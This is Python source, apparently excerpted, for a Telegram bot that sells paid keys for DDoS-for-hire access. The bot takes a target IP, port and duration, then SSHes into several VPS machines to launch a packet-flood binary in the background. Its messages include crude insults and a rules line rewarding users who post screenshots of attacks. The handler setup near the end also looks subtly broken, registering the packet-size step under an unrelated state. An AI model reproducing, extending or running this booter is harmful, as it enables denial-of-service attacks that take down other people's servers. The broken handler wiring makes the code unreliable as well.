...
async def redeem_key_input(update: Update, context: CallbackContext):
    ...
    if key in keys and keys[key]['expiration_time'] > time.time():
        ...
        await update.message.reply_text(
            ...
            f"• Max Threads: {SPECIAL_MAX_THREADS}\n\n"
            f"👑 *Bot Owner:* {current_display_name}\n\n"
            f"⚡ *Happy attacking and  ki ma ka chut phaad do!*",
            parse_mode='Markdown'
        )
    else:
        current_display_name = get_display_name(update.effective_chat.id)
...
async def attack_start(update: Update, context: CallbackContext):
    ...
    if user_id not in redeemed_users and not bot_open:
        current_display_name = get_display_name(update.effective_chat.id)
        await update.message.reply_text(
            f"❌ *You need a valid key to use this command!*\n\n"
            f"🔑 *Buy keys from {current_display_name}*",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    ...
    if bot_open:
        max_duration_for_user = 120
        max_threads_for_user = 100
        ...
        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special', False):
            if redeemed_users[user_id]['expiration_time'] <= current_time:
                ...
                await update.message.reply_text(
                    ...
                    f"🔑 *Buy new keys from {current_display_name}*",
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
            max_duration_for_user = SPECIAL_MAX_DURATION
            max_threads_for_user = SPECIAL_MAX_THREADS
        else:
            if redeemed_users[user_id] <= current_time:
                ...
                return ConversationHandler.END
            max_duration_for_user = max_duration
            max_threads_for_user = MAX_THREADS

    if current_time - last_attack_time < global_cooldown:
        remaining_cooldown = int(global_cooldown - (current_time - last_attack_time))
        await update.message.reply_text(
            f"⏳ *Please wait {remaining_cooldown} seconds before starting another attack!*",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    ...
    await update.message.reply_text(
        f"⚔️ *Enter attack parameters:*\n\n"
        f"Format: `<IP> <port> <duration>`\n"
        f"Example: `20.235.43.9 14533 120`\n\n"
        f"Max Duration: {max_duration_for_user} sec\n"
        f"Max Threads: {max_threads_for_user}\n"
        f"Packet Size: {context.user_data.get('packet_size', DEFAULT_PACKET_SIZE)} bytes\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown'
    )
...
async def attack_input(update: Update, context: CallbackContext):
    ...
    if bot_open:
        max_duration_for_user = 120
        max_threads_for_user = 100
    elif isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special', False):
        if redeemed_users[user_id]['expiration_time'] <= current_time:
            current_display_name = get_display_name(update.effective_chat.id)
            await update.message.reply_text(
                f"❌ *Your special key has expired!*\n\n"
    ...
    try:
        ...
        if len(args) != 3:
            await update.message.reply_text(
                "❌ *Invalid format! Use: `<IP> <port> <duration>`*",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
        ...
        if duration > max_duration_for_user:
            await update.message.reply_text(
                f"❌ *Duration cannot exceed {max_duration_for_user} seconds!*",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
        ...
        if not VPS_LIST:
            await update.message.reply_text(
                "❌ *No VPS available! Contact the bot owner.*",
                parse_mode='Markdown'
            )
            return ConversationHandler.END

        # Get available VPS
        available_vps = [vps for vps in VPS_LIST if vps[0] not in [attack['vps_ip'] for attack in running_attacks.values()]]
        if not available_vps:
            await update.message.reply_text(
                "❌ *All VPS are currently busy! Try again later.*",
                parse_mode='Markdown'
            )
            return ConversationHandler.END

        # Use all available VPS
        used_vps = available_vps[:ACTIVE_VPS_COUNT]
        packet_size = context.user_data.get('packet_size', DEFAULT_PACKET_SIZE)

        # Generate unique attack ID
        attack_id = f"{ip}:{port}-{str(uuid.uuid4())}"
        
        # Send initial message
        message = await update.message.reply_text(
            f"⚔️ *Starting attack on {ip}:{port}*\n\n"
            f"⏳ *Duration:* {duration} sec\n"
            f"🧵 *Threads:* {max_threads_for_user}\n"
            f"📏 *Packet Size:* {packet_size} bytes\n"
            f"🌐 *Using {len(used_vps)} VPS*\n\n"
            f"👑 *Bot Owner:* {get_display_name(update.effective_chat.id)}",
            parse_mode='Markdown'
        )
        ...
        running_attacks[attack_id] = {
            ...
            'is_special': isinstance(redeemed_users.get(user_id), dict) and redeemed_users[user_id].get('is_special', False),
            'message_id': message.message_id,
            'chat_id': update.effective_chat.id,
            'vps_ips': [vps[0] for vps in used_vps]
        }

        async def update_attack_message():
            while attack_id in running_attacks:
                elapsed = int(time.time() - running_attacks[attack_id]['start_time'])
                ...
                try:
                    ...
                    logging.error(f"Error updating attack message: {e}")
        ...
        # Start attack on each VPS
        success_count = 0
        fail_count = 0
        results = []

        for i, vps in enumerate(used_vps):
            ...
            try:
                ...
                command = f"{BINARY_PATH} {ip} {port} {duration} {packet_size} {max_threads_for_user}"
                
                # Execute attack command in background
                ssh.exec_command(f"nohup {command} > /dev/null 2>&1 &")
                
                results.append(f"✅ VPS {i+1} ({ip_vps}): Attack started")
                success_count += 1
                
                ssh.close()
            except Exception as e:
                results.append(f"❌ VPS {i+1} ({ip_vps}): Failed - {str(e)}")
                fail_count += 1
        ...
        # Start updating attack status
        asyncio.create_task(update_attack_message())

    except ValueError:
        await update.message.reply_text(
            "❌ *Invalid input! Use: `<IP> <port> <duration>`*",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
...
async def set_packet_size_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can set packet size!", parse_mode='Markdown')
        return ConversationHandler.END
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚠️ Enter new packet size in bytes (current: {context.user_data.get('packet_size', DEFAULT_PACKET_SIZE)}):\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown'
    )
    return SET_PACKET_SIZE

async def set_packet_size_input(update: Update, context: CallbackContext):
    try:
        packet_size = int(update.message.text)
        if packet_size < 64 or packet_size > 65535:
            await update.message.reply_text(
                "❌ Packet size must be between 64 and 65535 bytes!",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
        
        context.user_data['packet_size'] = packet_size
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"✅ Packet size set to {packet_size} bytes!\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
    except ValueError:
...
async def rules(update: Update, context: CallbackContext):
    ...
    rules_text = (
        ...
        "JO BHI KI MAKI CHUT PHAAD KE SS DEGA USSE EXTRA KEY DUNGA.\n\n"
    )
...
def main():
    ...
    setset_packet_size_handler = ConversationHandler(
        entry_points=[CommandHandler("setp", set_packet_size_start)],
    states={
        GET_VPS_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_packet_size_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )
